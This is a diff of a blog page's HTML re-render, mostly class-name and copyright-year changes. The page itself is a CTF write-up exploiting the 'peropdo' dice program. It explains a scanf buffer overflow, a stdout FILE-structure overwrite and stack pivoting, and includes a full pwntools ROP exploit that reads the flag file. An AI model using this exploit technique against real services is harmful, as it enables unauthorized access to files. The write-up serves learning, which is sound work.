@@ -305,18 +305,18 @@
 
 <!-- more -->
 
-<p>The program is a “rolling dice” program. First we input our name, then the program will ask us how many dice would we like to roll. After we input a number, the program will start generating some random data, then store them on the stack memory. The program will then print out <code class="highlighter-rouge">data[i] % 6 + 1</code>, which represent the numbers we roll in this round.</p>
+<p>The program is a “rolling dice” program. First we input our name, then the program will ask us how many dice would we like to roll. After we input a number, the program will start generating some random data, then store them on the stack memory. The program will then print out <code class="language-plaintext highlighter-rouge">data[i] % 6 + 1</code>, which represent the numbers we roll in this round.</p>
 
-<p>There’re two vulnerabilities in the program. First it use <code class="highlighter-rouge">scanf("%s", name)</code> to read our name, which lead to buffer overflow in the <code class="highlighter-rouge">name</code> buffer. Then, if we input a number that is larger than <strong>23</strong>, the data that program generated will overflow the <code class="highlighter-rouge">data[i]</code> buffer and <strong>thus overwrite the return address</strong> ( it will be a random data though ).</p>
+<p>There’re two vulnerabilities in the program. First it use <code class="language-plaintext highlighter-rouge">scanf("%s", name)</code> to read our name, which lead to buffer overflow in the <code class="language-plaintext highlighter-rouge">name</code> buffer. Then, if we input a number that is larger than <strong>23</strong>, the data that program generated will overflow the <code class="language-plaintext highlighter-rouge">data[i]</code> buffer and <strong>thus overwrite the return address</strong> ( it will be a random data though ).</p>
 
 <p>Since the binary was stripped, I wasn’t sure which algorithm the program used for randomizing, the only thing I knew is that the algorithm will use our name to generate the random data. At that moment, I thought it was just some self-implement function ( which is <strong>NOT</strong> correct, we’ll get into that later).</p>
 
 <p>And so I thought “Hmmm, maybe I could use some symbolic execution tool to calculate the address I want to return, and do the ROP attack”. <strong>This was such a huge mistake</strong>, since I’m not familiar with any of the symbolic execution tools – <a href="http://angr.io/">angr</a>, <a href="https://github.com/JonathanSalwan/Triton">Triton</a>, not to mention the fresh out <a href="https://github.com/trailofbits/manticore">manticore</a>. Even worse, all of the tool failed to calculate the address – Triton and manticore couldn’t even execute the program, it just crashed :(</p>
 
-<p>After wasting lots of time with those symbolic execution tools, I decided to try something different – the first vulnerability: overflowing the <code class="highlighter-rouge">name</code> buffer. And the result was encouraging – since I found that I could hijack the control flow by using the <code class="highlighter-rouge">call reg</code> and the <code class="highlighter-rouge">call [reg+offset]</code> gadget ( we can control the content of several registers ). It seems that there’re some <code class="highlighter-rouge">FILE*</code> pointer behind the <code class="highlighter-rouge">name</code> buffer, so we can exploit the service by <a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">abusing the FILE structure</a> ( we can’t control the function parameters though).</p>
+<p>After wasting lots of time with those symbolic execution tools, I decided to try something different – the first vulnerability: overflowing the <code class="language-plaintext highlighter-rouge">name</code> buffer. And the result was encouraging – since I found that I could hijack the control flow by using the <code class="language-plaintext highlighter-rouge">call reg</code> and the <code class="language-plaintext highlighter-rouge">call [reg+offset]</code> gadget ( we can control the content of several registers ). It seems that there’re some <code class="language-plaintext highlighter-rouge">FILE*</code> pointer behind the <code class="language-plaintext highlighter-rouge">name</code> buffer, so we can exploit the service by <a href="https://outflux.net/blog/archives/2011/12/22/abusing-the-file-structure/">abusing the FILE structure</a> ( we can’t control the function parameters though).</p>
 
-<p>Here I chose to use the second gadget ( <code class="highlighter-rouge">call [reg+offset]</code> ), since when the program execute to that line of code, its second parameter will be the <code class="highlighter-rouge">FILE*</code> pointer of <code class="highlighter-rouge">stdout</code>. I control the <code class="highlighter-rouge">eip</code> and jump to the middle of the main function:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov     dword ptr [esp+4], offset name
+<p>Here I chose to use the second gadget ( <code class="language-plaintext highlighter-rouge">call [reg+offset]</code> ), since when the program execute to that line of code, its second parameter will be the <code class="language-plaintext highlighter-rouge">FILE*</code> pointer of <code class="language-plaintext highlighter-rouge">stdout</code>. I control the <code class="language-plaintext highlighter-rouge">eip</code> and jump to the middle of the main function:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mov     dword ptr [esp+4], offset name
 mov     dword ptr [esp], (offset aSSSS+8) ; "%s" &lt;--- I jump to here
 call    scanf
 mov     eax, ds:name
@@ -326,18 +326,18 @@ mov     dword ptr [esp], offset name
 call    do_main
 </code></pre></div></div>
 
-<p>This will make the program store the <code class="highlighter-rouge">%s</code> string to the first parameter, then call the <code class="highlighter-rouge">scanf</code> function, making the program calling <code class="highlighter-rouge">scanf("%s", stdout)</code> – and thus we can control the content of <code class="highlighter-rouge">stdout</code> !</p>
+<p>This will make the program store the <code class="language-plaintext highlighter-rouge">%s</code> string to the first parameter, then call the <code class="language-plaintext highlighter-rouge">scanf</code> function, making the program calling <code class="language-plaintext highlighter-rouge">scanf("%s", stdout)</code> – and thus we can control the content of <code class="language-plaintext highlighter-rouge">stdout</code> !</p>
 
-<p>By crafting <code class="highlighter-rouge">stdout</code>, we can actually hijack the control flow, while having the first parameter controlled. This allowed us to do some advanced ROP attack. Here’s what I did after I controlled the <code class="highlighter-rouge">eip</code>:</p>
+<p>By crafting <code class="language-plaintext highlighter-rouge">stdout</code>, we can actually hijack the control flow, while having the first parameter controlled. This allowed us to do some advanced ROP attack. Here’s what I did after I controlled the <code class="language-plaintext highlighter-rouge">eip</code>:</p>
 <ol>
-  <li>Jump to <code class="highlighter-rouge">xchg esp, eax</code> gadget, migrate the stack to <code class="highlighter-rouge">stdout</code> (which now controlled by us)</li>
-  <li>Use <code class="highlighter-rouge">add esp, offset</code> to skip the uncontrollable member data in <code class="highlighter-rouge">stdout</code></li>
+  <li>Jump to <code class="language-plaintext highlighter-rouge">xchg esp, eax</code> gadget, migrate the stack to <code class="language-plaintext highlighter-rouge">stdout</code> (which now controlled by us)</li>
+  <li>Use <code class="language-plaintext highlighter-rouge">add esp, offset</code> to skip the uncontrollable member data in <code class="language-plaintext highlighter-rouge">stdout</code></li>
   <li>Since it’s a static linked binary, it’s easy for us to find some gadgets and do the <strong>open/read/write</strong> syscall, making the service print out the flag of the challenge. (The <strong>execve</strong> syscall seems to be filtered out in this challenge)</li>
 </ol>
 
 <p>Final exploit:</p>
-<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
-
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python
+</span>
 <span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">subprocess</span>
 <span class="kn">import</span> <span class="nn">sys</span>
@@ -348,77 +348,77 @@ call    do_main
 <span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./peropdo"</span>
 
 <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">ELF_PATH</span>
-<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
-<span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c"># for gdb.attach</span>
-
-<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c"># context.binary is an ELF object</span>
-
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span> <span class="c1"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']
+</span><span class="n">context</span><span class="o">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'splitw'</span><span class="p">]</span> <span class="c1"># for gdb.attach
+</span>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="c1"># context.binary is an ELF object
+</span>
 <span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
     <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
-    <span class="c">#r = process(ELF_PATH)</span>
-    
-    <span class="c">#gdb.attach(r, gdbscript=open("./ggg", "r"))</span>
-    <span class="n">func</span> <span class="o">=</span> <span class="mh">0x0806d7aa</span> <span class="c"># avoid crash</span>
-    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x08048b2a</span>
+    <span class="c1">#r = process(ELF_PATH)
+</span>    
+    <span class="c1">#gdb.attach(r, gdbscript=open("./ggg", "r"))
+</span>    <span class="n">func</span> <span class="o">=</span> <span class="mh">0x0806d7aa</span> <span class="c1"># avoid crash
+</span>    <span class="n">scanf</span> <span class="o">=</span> <span class="mh">0x08048b2a</span>
     <span class="n">name</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="n">scanf</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">func</span><span class="p">)</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x42</span><span class="s">"</span><span class="o">*</span><span class="mi">972</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80ecdf4</span><span class="p">)</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="o">*</span><span class="mi">92</span>  <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80ecdf8</span><span class="p">)</span> 
     <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"name?"</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>
 
-    <span class="c"># Later the program will call scanf("%s", stdout);</span>
-    <span class="c"># now we can overwrite the whole stdout FILE structure</span>
-
-    <span class="n">stream</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08079824</span><span class="p">)</span> <span class="c"># second gadget: add esp, 0x84....</span>
-    <span class="n">stream</span> <span class="o">+=</span> <span class="s">"/home/peropdo/flag</span><span class="se">\x00</span><span class="s">"</span> <span class="c"># flag path</span>
-    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
-    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b45c</span><span class="p">)</span> <span class="c"># eip, first gadget: xchg esp, eax ; ret</span>
-    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
-    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080ED3E8</span><span class="p">)</span> <span class="c"># pointer to null</span>
-    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
-    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x807982b</span><span class="p">)</span> <span class="c"># third gadget: pop; ret</span>
-    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80eb2a0</span><span class="p">)</span> <span class="c"># fake jump table</span>
-    
-    <span class="c"># 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret </span>
-    <span class="c"># 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret</span>
-    <span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x806f322</span>  <span class="c"># pop ebx;ret</span>
-    <span class="n">pop_eax</span> <span class="o">=</span> <span class="mh">0x80e3525</span>  <span class="c"># pop eax;ret</span>
-    <span class="n">pop_ecx</span> <span class="o">=</span> <span class="mh">0x080e5ee1</span> <span class="c"># pop ecx ; ret </span>
-    <span class="n">pop_edx</span> <span class="o">=</span> <span class="mh">0x0806f2fa</span> <span class="c"># pop edx ; ret</span>
-    <span class="n">int80</span> <span class="o">=</span> <span class="mh">0x806fae0</span>    <span class="c"># int 0x80 ; ret </span>
-    <span class="n">buf</span> <span class="o">=</span> <span class="mh">0x80ed000</span><span class="o">-</span><span class="mh">0x100</span>
+    <span class="c1"># Later the program will call scanf("%s", stdout);
+</span>    <span class="c1"># now we can overwrite the whole stdout FILE structure
+</span>
+    <span class="n">stream</span> <span class="o">=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08079824</span><span class="p">)</span> <span class="c1"># second gadget: add esp, 0x84....
+</span>    <span class="n">stream</span> <span class="o">+=</span> <span class="s">"/home/peropdo/flag</span><span class="se">\x00</span><span class="s">"</span> <span class="c1"># flag path
+</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x1c</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x804b45c</span><span class="p">)</span> <span class="c1"># eip, first gadget: xchg esp, eax ; ret
+</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x48</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x080ED3E8</span><span class="p">)</span> <span class="c1"># pointer to null
+</span>    <span class="n">stream</span> <span class="o">=</span> <span class="n">stream</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x90</span><span class="p">,</span> <span class="s">'</span><span class="se">\0</span><span class="s">'</span><span class="p">)</span>
+    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x807982b</span><span class="p">)</span> <span class="c1"># third gadget: pop; ret
+</span>    <span class="n">stream</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x80eb2a0</span><span class="p">)</span> <span class="c1"># fake jump table
+</span>    
+    <span class="c1"># 0x08074f2e : mov eax, 5 ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret 
+</span>    <span class="c1"># 0x08079465 : mov ebx, eax ; mov eax, ebx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
+</span>    <span class="n">pop_ebx</span> <span class="o">=</span> <span class="mh">0x806f322</span>  <span class="c1"># pop ebx;ret
+</span>    <span class="n">pop_eax</span> <span class="o">=</span> <span class="mh">0x80e3525</span>  <span class="c1"># pop eax;ret
+</span>    <span class="n">pop_ecx</span> <span class="o">=</span> <span class="mh">0x080e5ee1</span> <span class="c1"># pop ecx ; ret 
+</span>    <span class="n">pop_edx</span> <span class="o">=</span> <span class="mh">0x0806f2fa</span> <span class="c1"># pop edx ; ret
+</span>    <span class="n">int80</span> <span class="o">=</span> <span class="mh">0x806fae0</span>    <span class="c1"># int 0x80 ; ret 
+</span>    <span class="n">buf</span> <span class="o">=</span> <span class="mh">0x80ed000</span><span class="o">-</span><span class="mh">0x100</span>
     <span class="n">rop</span> <span class="o">=</span> <span class="n">flat</span><span class="p">(</span>
                 <span class="n">pop_ecx</span><span class="p">,</span>
                 <span class="mi">0</span><span class="p">,</span>
                 <span class="n">pop_edx</span><span class="p">,</span> 
                 <span class="mi">0</span><span class="p">,</span>
-                <span class="mh">0x08074f2e</span><span class="p">,</span> <span class="c"># mov eax = 5 (open), pop ebx...</span>
-                <span class="mh">0x80eb2a4</span><span class="p">,</span> <span class="c"># ptr to flag path</span>
-                <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],</span>
+                <span class="mh">0x08074f2e</span><span class="p">,</span> <span class="c1"># mov eax = 5 (open), pop ebx...
+</span>                <span class="mh">0x80eb2a4</span><span class="p">,</span> <span class="c1"># ptr to flag path
+</span>                <span class="p">[</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mi">0</span><span class="p">],</span>
                 <span class="n">int80</span><span class="p">,</span>              
                 <span class="n">pop_eax</span><span class="p">,</span>
-                <span class="mi">3</span><span class="p">,</span> <span class="c"># read</span>
-                <span class="n">pop_ebx</span><span class="p">,</span>
-                <span class="mi">3</span><span class="p">,</span> <span class="c">#fd</span>
-                <span class="n">pop_ecx</span><span class="p">,</span>
+                <span class="mi">3</span><span class="p">,</span> <span class="c1"># read
+</span>                <span class="n">pop_ebx</span><span class="p">,</span>
+                <span class="mi">3</span><span class="p">,</span> <span class="c1">#fd
+</span>                <span class="n">pop_ecx</span><span class="p">,</span>
                 <span class="n">buf</span><span class="p">,</span>
                 <span class="n">pop_edx</span><span class="p">,</span>
                 <span class="mh">0x100</span><span class="p">,</span>
                 <span class="n">int80</span><span class="p">,</span>
                 <span class="n">pop_ebx</span><span class="p">,</span>
-                <span class="mi">1</span><span class="p">,</span> <span class="c"># fd,</span>
-                <span class="n">pop_eax</span><span class="p">,</span>
-                <span class="mi">4</span><span class="p">,</span> <span class="c"># write</span>
-                <span class="n">int80</span>
+                <span class="mi">1</span><span class="p">,</span> <span class="c1"># fd,
+</span>                <span class="n">pop_eax</span><span class="p">,</span>
+                <span class="mi">4</span><span class="p">,</span> <span class="c1"># write
+</span>                <span class="n">int80</span>
               <span class="p">)</span>
 
     <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">stream</span> <span class="o">+</span> <span class="n">rop</span><span class="p">)</span>
     <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
-<p>flag: <code class="highlighter-rouge">Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code></p>
+<p>flag: <code class="language-plaintext highlighter-rouge">Thanks to Kenshoto for the inspiration! 5fbb34920c457b2e0855a174b8de3ebc</code></p>
 
-<p>Later did I know (thanks to teammate <a href="https://poning.me/">Isaac</a>) that there’s a thing call <a href="https://www.hex-rays.com/products/ida/tech/flirt/index.shtml">FLIRT</a> in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( <a href="https://github.com/push0ebp/sig-database">here’s</a> the DB I used for this challenge ), and use <strong>FILE –&gt; Load File –&gt; FLIRT signature file</strong> to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we’ll be able to identify some libc function, even the location of <code class="highlighter-rouge">stdout</code>.</p>
+<p>Later did I know (thanks to teammate <a href="https://poning.me/">Isaac</a>) that there’s a thing call <a href="https://www.hex-rays.com/products/ida/tech/flirt/index.shtml">FLIRT</a> in IDA Pro, which can help the user identify the function call in libc. All we need to do is download a FLIRT signature database from github ( <a href="https://github.com/push0ebp/sig-database">here’s</a> the DB I used for this challenge ), and use <strong>FILE –&gt; Load File –&gt; FLIRT signature file</strong> to load the database. IDA will then identify the function name, making the reverse engineering less painful. By using this technique, we’ll be able to identify some libc function, even the location of <code class="language-plaintext highlighter-rouge">stdout</code>.</p>
 
-<p>And that’s when I found that the “self-implement random” function is actually just <code class="highlighter-rouge">srand()</code> &amp; <code class="highlighter-rouge">rand()</code> in libc. According to <a href="https://github.com/mehQQ">meh</a> from HITCON, you can just brute-force the desired return address. Moreover, because the <code class="highlighter-rouge">name</code> buffer address is right under the return address, so you can just use <code class="highlighter-rouge">pop esp; ret</code> to migrate the stack into <code class="highlighter-rouge">name</code> buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/</p>
+<p>And that’s when I found that the “self-implement random” function is actually just <code class="language-plaintext highlighter-rouge">srand()</code> &amp; <code class="language-plaintext highlighter-rouge">rand()</code> in libc. According to <a href="https://github.com/mehQQ">meh</a> from HITCON, you can just brute-force the desired return address. Moreover, because the <code class="language-plaintext highlighter-rouge">name</code> buffer address is right under the return address, so you can just use <code class="language-plaintext highlighter-rouge">pop esp; ret</code> to migrate the stack into <code class="language-plaintext highlighter-rouge">name</code> buffer, and do the ROP attack. Guess I still got a lot of shit to learn :/</p>
 
         
       </section>
@@ -535,7 +535,6 @@ call    do_main
       <div class="grid__wrapper">
         
           
-          
 
 
 
@@ -555,7 +554,6 @@ call    do_main
 
         
           
-          
 
 
 
@@ -574,7 +572,6 @@ call    do_main
 </div>
 
         
-          
           
 
 
@@ -597,7 +594,6 @@ call    do_main
 
         
           
-          
 
 
 
@@ -618,6 +614,7 @@ call    do_main
         
       </div>
     </div>
+  
   
 </div>
 
@@ -668,7 +665,7 @@ call    do_main
   </ul>
 </div>
 
-<div class="page__footer-copyright">&copy; 2019 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+<div class="page__footer-copyright">&copy; 2020 Bruce Chen. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
 
       </footer>
     </div>
